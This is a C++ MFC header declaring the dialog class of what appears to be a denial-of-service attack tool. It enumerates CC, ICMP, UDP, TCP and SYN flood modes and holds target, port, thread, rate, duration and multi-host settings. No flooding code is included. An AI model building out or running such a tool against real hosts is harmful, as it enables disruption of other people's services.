
#pragma once
/////////////////////////////////////////
// CFlowAttackDlg dialog
#include "EasySize.h"

enum
{
	ATTACK_CCFLOOD,     //变异CC
	ATTACK_IMITATEIE,   //模拟IE
	ATTACK_LOOPCC,      //轮回CC
	ATTACK_ICMPFLOOD,   //ICMP
	ATTACK_UDPFLOOD,    //UDP
	ATTACK_TCPFLOOD,    //TCP
	ATTACK_SYNFLOOD,	//SYN
	ATTACK_BRAINPOWER,  //智能.
	CUSTOM_TCPSEND = 100, //TCP 发包
	CUSTOM_UDPSEND,     //UDP 发包
};


class CFlowAttackDlg : public CDialog
{
	DECLARE_DYNAMIC(CFlowAttackDlg)
	// Construction
public:
	CFlowAttackDlg(CWnd* pParent = NULL);   // standard constructor
	LPWSTR HexToDecimal(LPWSTR Transition = NULL, BOOL Format = FALSE);
	WORD ForMatFlowAddr(LPWSTR szAddr, WORD iPort);
	TCHAR htod(TCHAR c);
	VOID ShowThreads();

	DECLARE_EASYSIZE

	LPVOID Point;//父窗口指针
	//LPVOID ViewPoint;//View 指针

// Dialog Data
	//{{AFX_DATA(CFlowAttackDlg)
	enum {
		IDD = IDD_CUSTOMATTACK_DIALOG
	};
	CComboBox	m_ModelCtrl;
	CSliderCtrl	m_TimeCtrl;
	CSliderCtrl	m_ThreadCtrl;
	CSpinButtonCtrl	m_RateCtrl;
	CSpinButtonCtrl	m_HotsNumCtrl;
	CString	m_Decimal;
	CString	m_HexData;
	UINT	m_HostNum;
	UINT	m_SendRate;
	UINT	m_Thread;
	UINT	m_AttackTime;
	CString	m_Target;
	UINT	m_Port;
	BOOL	m_Select;
	CString	m_TipShow;
	CBrush m_brush;
	COLORREF clr;
	//}}AFX_DATA


// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CFlowAttackDlg)
protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:

	// Generated message map functions
	//{{AFX_MSG(CFlowAttackDlg)
	afx_msg void OnChangeEditDecimal();
	afx_msg void OnSetfocusEditDecimal();
	afx_msg void OnSetfocusEditHex();
	afx_msg void OnChangeEditHex();
	virtual BOOL OnInitDialog();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnCustomdrawSliderTime(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnCustomdrawSliderThread(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnStartAttack();
	afx_msg void OnStartStop();
	afx_msg void OnSelecthost();
	afx_msg void OnChangeTargetWeb();
	afx_msg void OnSetfocusTargetWeb();
	afx_msg void OnSetfocusComboModel();
	afx_msg void OnSelchangeComboModel();
	afx_msg void OnSetfocusThreadnums();
	afx_msg void OnChangeThreadnums();
	afx_msg void OnChangeAttacktimes();
	afx_msg void OnSetfocusAttacktimes();
	afx_msg void OnSetfocusSendRate();
	afx_msg void OnChangeSendRate();
	afx_msg void OnChangeHostnums();
	afx_msg void OnSetfocusHostnums();
	afx_msg void OnChangeAttckport();
	afx_msg void OnSetfocusAttckport();
	afx_msg HBRUSH OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor);
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
private:
	BOOL m_MarkPos;
	WORD m_Size;
	WORD iTaskID;
};

